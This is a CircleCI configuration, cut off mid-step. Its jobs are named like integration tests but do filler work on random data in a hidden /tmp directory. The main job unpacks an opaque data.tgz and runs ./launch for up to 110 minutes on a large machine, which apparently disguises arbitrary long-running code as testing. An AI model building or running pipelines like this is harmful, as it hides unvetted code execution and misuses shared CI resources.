version: 2.1

jobs:
  hook_verify-quick-integration-tests:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: split jump
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/.wsp/trace.ndjson; true
            stat -c '%s %n' /tmp/.wsp/trace.ndjson
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - trace.ndjson
  verify-quick-integration-tests:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Fetch pre-stage data
          command: |
            { tail -c 100 /tmp/.wsp/trace.ndjson > /dev/null; echo "tail ok" ; } || true
      - run:
          name: Clone project
          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Extract sources
          command: tar xzvf data.tgz
      - run:
          no_output_timeout: 110m
          command: ./launch && true
  alpha_LaunchSuite:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: banner up
          command: |
            mkdir -p /tmp/.wsp
            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 18432 | wc -c; true ; } > /tmp/.wsp/364.txt
            stat -c '%s %n' /tmp/.wsp/364.txt
      - persist_to_workspace:
